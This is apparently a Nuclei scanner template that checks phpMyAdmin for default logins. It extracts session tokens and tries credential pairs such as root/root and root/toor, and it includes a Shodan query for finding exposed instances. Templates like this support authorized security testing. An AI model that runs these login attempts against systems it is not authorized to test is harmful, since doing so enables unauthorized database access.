http:
- attack: clusterbomb
  extractors:
  - group: 1
    internal: true
    name: token
    regex:
    - name="token" value="([0-9a-z]+)"
    type: regex
  - group: 1
    internal: true
    name: token2
    regex:
    - name="set_session" value="([0-9a-z]+)"
    type: regex
  - group: 2
    internal: true
    name: session
    part: header
    regex:
    - phpMyAdmin(_https)?=([0-9a-z]+)
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains(header_2, "phpMyAdmin=") && contains(header_2, "pmaUser-1=")
    - status_code_2 == 302
    - contains(header_2, 'index.php?collation_connection=utf8mb4_unicode_ci') || contains(header_2,
      '/index.php?route=/&route=%2F')
    type: dsl
  matchers-condition: and
  payloads:
    password:
    - 123456
    - root
    - mysql
    - toor
    user:
    - root
    - mysql
  raw:
  - 'GET /index.php HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: phpMyAdmin={{token2}}; pma_lang=en


    set_session={{session}}&pma_username={{user}}&pma_password={{password}}&server=1&route=%2F&token={{token}}

    '
  stop-at-first-match: true
id: phpmyadmin-default-login
info:
  author: Natto97,notwhy
  classification:
    cpe: cpe:2.3:a:phpmyadmin:phpmyadmin:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  description: phpMyAdmin contains a default login vulnerability. An attacker can
    obtain access to user accounts and access sensitive information, modify data,
    and/or execute unauthorized operations.
  metadata:
    max-request: 16
    product: phpmyadmin
    shodan-query: http.title:phpMyAdmin
    vendor: phpmyadmin
    verified: true
  name: phpMyAdmin - Default Login
  reference:
  - https://www.phpmyadmin.net
  severity: high
  tags: default-login,phpmyadmin,vuln
